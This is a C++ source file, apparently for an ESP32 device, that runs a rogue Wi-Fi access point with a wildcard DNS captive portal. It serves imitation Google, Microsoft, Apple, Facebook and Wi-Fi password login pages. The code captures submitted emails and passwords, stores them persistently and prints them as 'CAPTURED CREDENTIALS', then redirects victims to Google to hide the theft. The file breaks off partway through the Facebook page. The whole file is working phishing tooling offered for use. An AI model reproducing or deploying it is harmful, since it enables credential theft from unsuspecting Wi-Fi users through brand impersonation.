#include "captive_portal.h"

// ===== Configuration Constants =====
const byte DNS_PORT = 53;
const int MAX_CREDENTIALS = 50;
const int CLIENT_TIMEOUT = 3000000;  // 5 minutes

// ===== Global Instance =====
CaptivePortal portalManager;

// ===== Method Implementations =====

CaptivePortal::CaptivePortal() : server(80), portalRunning(false), credentialCount(0), credentialsCaptured(0) {
  apIP = IPAddress(192, 168, 1, 1);
  redirectURL = "http://www.google.com";
  portalStartTime = 0;

  // Initialize client sessions
  for (int i = 0; i < 10; i++) {
    clients[i] = ClientSession();
  }
}

String CaptivePortal::generateClientId() {
  return String(millis()) + String(random(1000, 9999));
}

String CaptivePortal::getTimestamp() {
  unsigned long now = millis();
  unsigned long seconds = now / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;

  char timestamp[20];
  snprintf(timestamp, sizeof(timestamp), "%02lu:%02lu:%02lu",
           hours % 24, minutes % 60, seconds % 60);
  return String(timestamp);
}

String CaptivePortal::getClientIP() {
  return server.client().remoteIP().toString();
}

String CaptivePortal::getUserAgent() {
  return server.hasHeader("User-Agent") ? server.header("User-Agent") : "Unknown";
}

CaptivePortal::ClientSession* CaptivePortal::findOrCreateClient(const String& ip) {
  // Find existing client
  for (int i = 0; i < 10; i++) {
    if (clients[i].ip == ip) {
      clients[i].lastActivity = millis();
      return &clients[i];
    }
  }

  // Create new client
  for (int i = 0; i < 10; i++) {
    if (clients[i].ip == "") {
      clients[i].id = generateClientId();
      clients[i].ip = ip;
      clients[i].firstSeen = millis();
      clients[i].lastActivity = millis();
      clients[i].submittedCredentials = false;
      clients[i].userAgent = getUserAgent();
      return &clients[i];
    }
  }

  return nullptr;
}

void CaptivePortal::cleanupOldClients() {
  unsigned long now = millis();
  for (int i = 0; i < 10; i++) {
    if (clients[i].ip != "" && (now - clients[i].lastActivity > CLIENT_TIMEOUT)) {
      clients[i] = ClientSession();  // Reset
    }
  }
}

void CaptivePortal::saveCredential(const String& email, const String& password, ClientSession* client) {
  if (credentialCount >= MAX_CREDENTIALS) {
    // Shift array to make space (FIFO)
    for (int i = 0; i < MAX_CREDENTIALS - 1; i++) {
      capturedCredentials[i] = capturedCredentials[i + 1];
    }
    credentialCount = MAX_CREDENTIALS - 1;
  }

  Credential& cred = capturedCredentials[credentialCount++];
  cred.timestamp = getTimestamp();
  cred.clientId = client ? client->id : "Unknown";
  cred.clientIP = getClientIP();
  cred.userAgent = getUserAgent();
  cred.portalType = portalType;
  cred.ssid = apSSID;
  cred.email = email;
  cred.password = password;
  cred.additionalInfo = "User-Agent: " + getUserAgent();

  credentialsCaptured++;

  if (client) {
    client->submittedCredentials = true;
  }

  // Save to persistent storage
  saveToPreferences();

  Serial.println("\n=== CAPTURED CREDENTIALS ===");
  Serial.println("Time: " + cred.timestamp);
  Serial.println("Client: " + cred.clientIP);
  Serial.println("Portal: " + cred.portalType);
  Serial.println("SSID: " + cred.ssid);
  if (cred.email != "") Serial.println("Email: " + cred.email);
  Serial.println("Password: " + cred.password);
  Serial.println("User-Agent: " + cred.userAgent);
  Serial.println("============================\n");
}

void CaptivePortal::saveToPreferences() {
  if (preferences.begin("captive_portal", false)) {
    preferences.putUInt("cred_count", credentialCount);
    preferences.putUInt("total_captured", credentialsCaptured);

    for (int i = 0; i < credentialCount; i++) {
      String prefix = "cred_" + String(i) + "_";
      preferences.putString((prefix + "time").c_str(), capturedCredentials[i].timestamp);
      preferences.putString((prefix + "email").c_str(), capturedCredentials[i].email);
      preferences.putString((prefix + "password").c_str(), capturedCredentials[i].password);
      preferences.putString((prefix + "ssid").c_str(), capturedCredentials[i].ssid);
      preferences.putString((prefix + "client_ip").c_str(), capturedCredentials[i].clientIP);
      preferences.putString((prefix + "user_agent").c_str(), capturedCredentials[i].userAgent);
      preferences.putString((prefix + "portal_type").c_str(), capturedCredentials[i].portalType);
    }

    preferences.end();
  }
}

void CaptivePortal::loadFromPreferences() {
  if (preferences.begin("captive_portal", true)) {
    credentialCount = preferences.getUInt("cred_count", 0);
    credentialsCaptured = preferences.getUInt("total_captured", 0);

    for (int i = 0; i < credentialCount && i < MAX_CREDENTIALS; i++) {
      String prefix = "cred_" + String(i) + "_";
      capturedCredentials[i].timestamp = preferences.getString((prefix + "time").c_str(), "");
      capturedCredentials[i].email = preferences.getString((prefix + "email").c_str(), "");
      capturedCredentials[i].password = preferences.getString((prefix + "password").c_str(), "");
      capturedCredentials[i].ssid = preferences.getString((prefix + "ssid").c_str(), "");
      capturedCredentials[i].clientIP = preferences.getString((prefix + "client_ip").c_str(), "");
      capturedCredentials[i].userAgent = preferences.getString((prefix + "user_agent").c_str(), "");
      capturedCredentials[i].portalType = preferences.getString((prefix + "portal_type").c_str(), "");
    }

    preferences.end();
  }
}

// ===== Request Handlers =====
void CaptivePortal::handleRoot() {
  String html;

  if (portalType == "google") {
    html = getGoogleLoginPage();
  } else if (portalType == "microsoft") {
    html = getMicrosoftLoginPage();
  } else if (portalType == "apple") {
    html = getAppleLoginPage();
  } else if (portalType == "facebook") {
    html = getFacebookLoginPage();
  } else {
    html = getWifiLoginPage();
    html.replace("REPLACE_SSID", apSSID);
  }

  findOrCreateClient(getClientIP());
  server.send(200, "text/html", html);
}

void CaptivePortal::handleLogin() {
  ClientSession* client = findOrCreateClient(getClientIP());

  String email = server.arg("email");
  String password = server.arg("password");

  // For WiFi portals, password might come as the only field
  if (email == "" && password == "" && server.hasArg("password")) {
    password = server.arg("password");
  }

  if (email != "" || password != "") {
    saveCredential(email, password, client);
  }

  // Redirect to legitimate site
  server.sendHeader("Location", redirectURL, true);
  server.send(302, "text/plain", "");
}

void CaptivePortal::handleCapture() {
  server.send(200, "application/json", "{\"status\":\"success\"}");
}

void CaptivePortal::handleNotFound() {
  // Captive portal - redirect all requests to login page
  server.sendHeader("Location", "http://" + apIP.toString(), true);
  server.send(302, "text/plain", "");
}

// ===== Portal Control =====
bool CaptivePortal::startPortal(const String& ssid, const String& password, const String& type) {
  apSSID = ssid;
  apPassword = password;
  portalType = type;

  Serial.println("Initializing access point...");

  WiFi.mode(WIFI_AP);
  delay(500);

  // Use default IP if config fails
  if (!WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0))) {
    Serial.println("Using default AP configuration");
  }

  bool apStarted = false;
  int retryCount = 0;
  const int maxRetries = 3;

  while (retryCount < maxRetries && !apStarted) {
    Serial.println("Attempt " + String(retryCount + 1) + " to start AP...");

    if (apPassword.length() >= 8) {
      apStarted = WiFi.softAP(apSSID.c_str(), apPassword.c_str());
    } else {
      apStarted = WiFi.softAP(apSSID.c_str());
    }

    if (!apStarted) {
      retryCount++;
      delay(1000);

      if (retryCount < maxRetries) {
        WiFi.softAPdisconnect(true);
        delay(500);
        WiFi.mode(WIFI_AP);
        delay(500);
      }
    }
  }

  if (!apStarted) {
    Serial.println("Failed to start AP after " + String(maxRetries) + " attempts");
    return false;
  }

  Serial.println("AP started successfully, starting DNS server...");

  if (!dnsServer.start(DNS_PORT, "*", WiFi.softAPIP())) {
    Serial.println("Failed to start DNS server");
    WiFi.softAPdisconnect(true);
    return false;
  }

  server.on("/", HTTP_GET, [this]() {
    this->handleRoot();
  });
  server.on("/login", HTTP_POST, [this]() {
    this->handleLogin();
  });
  server.on("/generate_204", HTTP_GET, [this]() {
    this->handleRoot();
  });
  server.on("/captiveportal", HTTP_GET, [this]() {
    this->handleRoot();
  });
  server.on("/hotspot-detect.html", HTTP_GET, [this]() {
    this->handleRoot();
  });
  server.on("/connecttest.txt", HTTP_GET, [this]() {
    this->handleRoot();
  });
  server.on("/fwlink", HTTP_GET, [this]() {
    this->handleRoot();
  });
  server.on("/success.txt", HTTP_GET, [this]() {
    this->handleCapture();
  });
  server.on("/ncsi.txt", HTTP_GET, [this]() {
    this->handleCapture();
  });
  server.on("/capture", HTTP_GET, [this]() {
    this->handleCapture();
  });
  server.onNotFound([this]() {
    this->handleNotFound();
  });

  server.begin();

  portalRunning = true;
  portalStartTime = millis();

  loadFromPreferences();

  Serial.println("\n=== CAPTIVE PORTAL STARTED ===");
  Serial.println("SSID: " + apSSID);
  Serial.println("Password: " + (apPassword.length() >= 8 ? apPassword : "(open)"));
  Serial.println("Type: " + portalType);
  Serial.println("IP: " + WiFi.softAPIP().toString());
  Serial.println("MAC: " + getAPMAC());
  Serial.println("Clients: " + String(WiFi.softAPgetStationNum()));
  Serial.println("=============================\n");

  return true;
}

void CaptivePortal::stopPortal() {
  server.stop();
  delay(100);

  dnsServer.stop();
  delay(100);

  WiFi.softAPdisconnect(true);
  delay(100);

  portalRunning = false;
  Serial.println("Portal stopped");
}

void CaptivePortal::update() {
  if (portalRunning) {
    dnsServer.processNextRequest();
    server.handleClient();
    cleanupOldClients();
  }
}

void CaptivePortal::printCredentials() {
  Serial.println("\n=== CAPTURED CREDENTIALS ===");
  Serial.println("Total: " + String(credentialsCaptured));

  if (credentialCount == 0) {
    Serial.println("No credentials captured yet");
  } else {
    for (int i = 0; i < credentialCount; i++) {
      Credential& cred = capturedCredentials[i];
      Serial.println("--- Entry " + String(i + 1) + " ---");
      Serial.println("Time: " + cred.timestamp);
      Serial.println("Client: " + cred.clientIP);
      Serial.println("Portal: " + cred.portalType);
      Serial.println("SSID: " + cred.ssid);
      if (cred.email != "") Serial.println("Email: " + cred.email);
      Serial.println("Password: " + cred.password);
      Serial.println("User-Agent: " + cred.userAgent);
      Serial.println();
    }
  }
  Serial.println("============================\n");
}

void CaptivePortal::clearCredentials() {
  credentialCount = 0;
  credentialsCaptured = 0;

  preferences.begin("captive_portal", false);
  preferences.clear();
  preferences.end();

  Serial.println("All credentials cleared");
}

// ===== New Methods =====
String CaptivePortal::getAPIP() {
  return WiFi.softAPIP().toString();
}

String CaptivePortal::getAPMAC() {
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", 
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void CaptivePortal::setRedirectURL(const String& url) {
  redirectURL = url;
}

// ===== Getters =====
bool CaptivePortal::isRunning() {
  return portalRunning;
}
String CaptivePortal::getSSID() {
  return apSSID;
}
String CaptivePortal::getPortalType() {
  return portalType;
}
unsigned long CaptivePortal::getCredentialsCaptured() {
  return credentialsCaptured;
}
int CaptivePortal::getClientCount() {
  return WiFi.softAPgetStationNum();
}

const char* CaptivePortal::getGoogleLoginPage() {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 450px; }
        .header { text-align: center; margin-bottom: 40px; }
        .google-logo { width: 75px; height: 24px; margin-bottom: 20px; }
        .login-card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .login-title { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
        .login-subtitle { text-align: center; color: #5f6368; margin-bottom: 32px; font-size: 16px; }
        .form-group { margin-bottom: 24px; }
        .input-field { width: 100%; height: 54px; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: border-color 0.3s; }
        .input-field:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        .forgot-email { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .info-text { color: #5f6368; font-size: 14px; line-height: 1.4286; margin: 32px 0; }
        .info-text a { color: #1a73e8; text-decoration: none; }
        .button-group { display: flex; justify-content: space-between; align-items: center; }
        .create-account { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
        .next-button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.3s; }
        .next-button:hover { background: #1669d6; }
        .footer { margin-top: 40px; display: flex; justify-content: space-between; align-items: center; color: #5f6368; font-size: 12px; }
        .language-selector { border: none; background: none; color: #5f6368; font-size: 12px; cursor: pointer; }
        @media (max-width: 480px) {
            .login-card { padding: 24px 20px; border: none; box-shadow: none; }
            body { padding: 0; align-items: flex-start; padding-top: 40px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24">
                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/>
                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/>
                <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/>
                <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/>
                <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/>
                <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/>
            </svg>
        </div>
        
        <div class="login-card">
            <h1 class="login-title">Sign in</h1>
            <p class="login-subtitle">Use your Google Account</p>
            
            <form method="POST" action="/login">
                <div class="form-group">
                    <input type="email" name="email" class="input-field" placeholder="Email or phone" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
                </div>
                
                <a href="#" class="forgot-email">Forgot email?</a>
                
                <div class="info-text">
                    Not your computer? Use Guest mode to sign in privately. 
                    <a href="#">Learn more</a>
                </div>
                
                <div class="button-group">
                    <a href="#" class="create-account">Create account</a>
                    <button type="submit" class="next-button">Next</button>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <select class="language-selector">
                <option>English (United States)</option>
                <option>Español</option>
                <option>Français</option>
            </select>
            
            <div>
                <a href="#" style="color: #5f6368; text-decoration: none; margin-right: 16px; font-size: 12px;">Help</a>
                <a href="#" style="color: #5f6368; text-decoration: none; margin-right: 16px; font-size: 12px;">Privacy</a>
                <a href="#" style="color: #5f6368; text-decoration: none; font-size: 12px;">Terms</a>
            </div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

const char* CaptivePortal::getWifiLoginPage() {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Authentication Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 420px; }
        .login-card { background: white; border-radius: 16px; padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; }
        .wifi-icon { width: 64px; height: 64px; margin: 0 auto 20px; background: #4f46e5; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .wifi-icon svg { width: 32px; height: 32px; fill: white; }
        .login-title { font-size: 24px; font-weight: 600; color: #1f2937; margin-bottom: 8px; }
        .login-subtitle { color: #6b7280; margin-bottom: 8px; font-size: 16px; }
        .network-name { color: #4f46e5; font-weight: 600; font-size: 18px; margin-bottom: 32px; }
        .form-group { margin-bottom: 24px; text-align: left; }
        .input-label { display: block; margin-bottom: 8px; color: #374151; font-weight: 500; font-size: 14px; }
        .input-field { width: 100%; padding: 16px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px; transition: all 0.3s; }
        .input-field:focus { border-color: #4f46e5; outline: none; box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1); }
        .submit-button { width: 100%; background: #4f46e5; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        .submit-button:hover { background: #4338ca; }
        .security-notice { margin-top: 24px; padding: 16px; background: #f3f4f6; border-radius: 8px; font-size: 14px; color: #6b7280; }
        .security-notice strong { color: #059669; }
        .footer { margin-top: 32px; text-align: center; color: #9ca3af; font-size: 12px; }
        .provider-logo { margin-top: 16px; font-weight: 600; color: #4f46e5; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="wifi-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M12 21c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0-18c-5.3 0-10 4.7-10 10 0 1.1.9 2 2 2s2-.9 2-2c0-3.3 2.7-6 6-6s6 2.7 6 6c0 1.1.9 2 2 2s2-.9 2-2c0-5.3-4.7-10-10-10z"/>
                    <circle cx="12" cy="17" r="1"/>
                </svg>
            </div>
            
            <h1 class="login-title">Wi-Fi Authentication</h1>
            <p class="login-subtitle">Please enter the password for</p>
            <div class="network-name">REPLACE_SSID</div>
            
            <form method="POST" action="/login">
                <div class="form-group">
                    <label class="input-label">Wi-Fi Password</label>
                    <input type="password" name="password" class="input-field" placeholder="Enter network password" required>
                </div>
                
                <button type="submit" class="submit-button">Connect to Wi-Fi</button>
            </form>
            
            <div class="security-notice">
                <strong>Secure Connection</strong><br>
                Your information is protected with enterprise-grade security.
            </div>
            
            <div class="footer">
                <div>By connecting, you agree to our terms of service</div>
                <div class="provider-logo">ENTERPRISE WIFI SOLUTIONS</div>
            </div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

const char* CaptivePortal::getMicrosoftLoginPage() {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 440px; }
        .logo { margin-bottom: 24px; }
        .logo-svg { width: 108px; height: 24px; }
        .login-card { border: 1px solid #e1e1e1; border-radius: 4px; padding: 48px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .login-title { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
        .form-group { margin-bottom: 16px; }
        .input-label { display: block; margin-bottom: 8px; color: #323130; font-size: 14px; font-weight: 600; }
        .input-field { width: 100%; height: 42px; padding: 8px 12px; border: 1px solid #8a8886; border-radius: 2px; font-size: 14px; transition: border-color 0.3s; }
        .input-field:focus { border-color: #0078d4; outline: none; box-shadow: 0 0 0 1px #0078d4; }
        .forgot-password { color: #0078d4; text-decoration: none; font-size: 13px; margin-bottom: 20px; display: block; }
        .button-group { margin-top: 32px; }
        .back-button { background: transparent; border: 1px solid #8a8886; color: #323130; padding: 8px 16px; border-radius: 2px; font-size: 14px; font-weight: 600; cursor: pointer; margin-right: 8px; }
        .next-button { background: #0078d4; color: white; border: none; padding: 8px 24px; border-radius: 2px; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        .next-button:hover { background: #106ebe; }
        .signin-options { margin-top: 40px; padding-top: 20px; border-top: 1px solid #e1e1e1; }
        .option-button { width: 100%; background: transparent; border: 1px solid #8a8886; padding: 10px; border-radius: 2px; font-size: 13px; color: #323130; cursor: pointer; margin-bottom: 8px; text-align: left; padding-left: 40px; position: relative; }
        .option-button:before { content: ""; position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; background: currentColor; opacity: 0.6; }
        .footer { margin-top: 40px; text-align: center; color: #605e5c; font-size: 12px; }
        .footer-links { margin-top: 16px; }
        .footer-links a { color: #0078d4; text-decoration: none; margin: 0 8px; font-size: 12px; }
        @media (max-width: 480px) { .login-card { padding: 24px; border: none; box-shadow: none; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg class="logo-svg" viewBox="0 0 108 24">
                <path fill="#737373" d="M44.6,4.2v15.6h-3.3V4.2H44.6z M56.9,19.8h-3.3V4.2h3.3V19.8z M68.2,4.2v15.6h-3.3V4.2H68.2z M79.5,19.8h-3.3V4.2h3.3V19.8z M90.8,4.2v15.6h-3.3V4.2H90.8z M102.1,19.8h-3.3V4.2h3.3V19.8z"/>
                <path fill="#f25022" d="M12.4,4.2H4.2v7.2h8.2V4.2z"/>
                <path fill="#00a4ef" d="M12.4,12.6H4.2v7.2h8.2V12.6z"/>
                <path fill="#7fba00" d="M20.8,4.2h-8.2v7.2h8.2V4.2z"/>
                <path fill="#ffb900" d="M20.8,12.6h-8.2v7.2h8.2V12.6z"/>
            </svg>
        </div>
        
        <div class="login-card">
            <h1 class="login-title">Sign in</h1>
            
            <form method="POST" action="/login">
                <div class="form-group">
                    <label class="input-label">Email, phone, or Skype</label>
                    <input type="email" name="email" class="input-field" placeholder="Enter your email or phone number" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
                </div>
                
                <a href="#" class="forgot-password">No account? Create one!</a>
                
                <div class="button-group">
                    <button type="button" class="back-button">Back</button>
                    <button type="submit" class="next-button">Next</button>
                </div>
            </form>
            
            <div class="signin-options">
                <button type="button" class="option-button">Sign in with Windows Hello or a security key</button>
                <button type="button" class="option-button">Sign in with a verification code from the app</button>
            </div>
        </div>
        
        <div class="footer">
            <div>Microsoft Corporation © 2024</div>
            <div class="footer-links">
                <a href="#">Terms of use</a>
                <a href="#">Privacy & cookies</a>
                <a href="#">Contact us</a>
            </div>
        </div>
    </div>
</body>
</html>
)rawliteral";
}

const char* CaptivePortal::getAppleLoginPage() {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Apple ID</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #f5f5f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 380px; }
        .apple-logo { text-align: center; margin-bottom: 40px; }
        .apple-logo svg { width: 48px; height: 48px; fill: #000; }
        .login-card { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
        .login-title { font-size: 24px; font-weight: 600; margin-bottom: 8px; color: #1d1d1f; }
        .login-subtitle { color: #86868b; margin-bottom: 32px; font-size: 17px; }
        .form-group { margin-bottom: 16px; text-align: left; }
        .input-field { width: 100%; padding: 16px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; transition: border-color 0.3s; }
        .input-field:focus { border-color: #0071e3; outline: none; }
        .checkbox-group { text-align: left; margin: 24px 0; }
        .checkbox-label { display: flex; align-items: center; color: #1d1d1f; font-size: 14px; cursor: pointer; }
        .checkbox-label input { margin-right: 8px; }
        .submit-button { width: 100%; background: #0071e3; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        .submit-button:hover { background: #0077ed; }
        .divider { margin: 32px 0; position: relative; text-align: center; }
        .divider:before { content: ""; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: #d2d2d7; }
        .divider span { background: white; padding: 0 16px; color: #86868b; font-size: 14px; }
        .help-links { margin-top: 24px; text-align: center; }
        .help-links a { color: #0071e3; text-decoration: none; font-size: 14px; display: block; margin-bottom: 8px; }
        .footer { margin-top: 40px; text-align: center; color: #86868b; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="apple-logo">
            <svg viewBox="0 0 24 24">
                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
            </svg>
        </div>
        
        <div class="login-card">
            <h1 class="login-title">Sign in with your Apple ID</h1>
            <p class="login-subtitle">Use your Apple ID to sign in to this service.</p>
            
            <form method="POST" action="/login">
                <div class="form-group">
                    <input type="email" name="email" class="input-field" placeholder="Apple ID" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" class="input-field" placeholder="Password" required>
                </div>
                
                <div class="checkbox-group">
                    <label class="checkbox-label">
                        <input type="checkbox" name="remember">
                        Keep me signed in
                    </label>
                </div>
                
                <button type="submit" class="submit-button">Sign In</button>
            </form>
            
            <div class="divider">
                <span>or</span>
            </div>
            
            <div class="help-links">
                <a href="#">Forgot Apple ID or password?</a>
                <a href="#">Create your Apple ID</a>
                <a href="#">Privacy Policy</a>
            </div>
        </div>
        
        <div class="footer">
            Copyright © 2024 Apple Inc. All rights reserved.
        </div>
    </div>
</body>
</html>
)rawliteral";
}

const char* CaptivePortal::getFacebookLoginPage() {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 400px; }
        .facebook-logo { text-align: center; margin-bottom: 20px; }
        .facebook-logo svg { width: 240px; height: 84px; fill: #1877f2; }
        .login-card { background: white; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
        .login-title { font-size: 18px; color: #1c1e21; margin-bottom: 20px; font-weight: normal; }
        .form-group { margin-bottom: 12px; }
        .input-field { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; background: #f5f6f7; }
        .input-field:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-button { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-bottom: 16px; transition: background 0.3s; }
        .login-button:hover { background: #166fe5; }
        .forgot-password { color: #1877f2; text-decoration: none; font-size: 14px; margin-bottom: 20px; display: block; }
        .forgot-password:hover { text-decoration: underline; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .create-account { background: #42b72a; color: white; border: none; padding: 12px 16px; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
        .create-account:hover { background: #36a420; }
        .create-page { margin-top: 28px; text-align: center; color: #1c1e21; font-size: 14px; }
        .create-page a { color: #1c1e21; font-weight: bold; text-decoration: none; }
        .create-page a:hover { text-decoration: underline; }
        .footer { margin-top: 40px; text-align: center; color: #737373; font-size: 11px; }
        .footer-links { margin-top: 16px; }
        .footer-links a { color: #737373; text-decoration: none; margin: 0 4px; font-size: 11px; }
        .footer-links a:hover { text-decoration: underline; }
        .language-line { margin-top: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="facebook-logo">
            <svg viewBox="0 0 240 84">
